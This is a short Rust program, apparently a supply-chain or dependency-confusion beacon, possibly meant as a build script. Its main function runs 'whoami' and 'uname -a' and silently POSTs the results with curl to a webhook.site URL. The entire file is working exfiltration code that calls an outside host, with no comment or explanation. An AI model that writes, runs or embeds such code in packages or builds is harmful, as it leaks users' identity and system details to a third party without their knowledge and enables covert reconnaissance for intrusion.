use std::process::Command;
use std::fs;

fn main() {
    let whoami = Command::new("whoami").output().unwrap();
    let uname = Command::new("uname").arg("-a").output().unwrap();
    let payload = format!(
        "whoami: {}\nuname: {}",
        String::from_utf8_lossy(&whoami.stdout),
        String::from_utf8_lossy(&uname.stdout)
    );
    let _ = Command::new("curl")
        .arg("-X")
        .arg("POST")
        .arg("https://webhook.site/b0c9f97b-3237-4b13-b3b7-920e02ff5f7f")
        .arg("-d")
        .arg(payload)
        .output();
}
